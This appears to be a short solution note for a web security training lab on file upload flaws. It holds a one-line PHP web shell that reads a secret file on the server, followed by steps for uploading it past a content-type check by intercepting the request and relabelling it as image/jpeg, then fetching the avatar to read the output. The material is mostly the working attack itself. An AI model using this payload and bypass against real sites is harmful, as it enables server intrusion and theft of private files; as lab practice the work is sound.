<?php echo file_get_contents('/home/carlos/secret'); ?>

/*
uploading the file 
intercepting the request
change the content-type to image/jpeg forward the request
now tun off intercept and reload the my account page it will send a request to fetch and display avatar
capture the request and see the secret
*/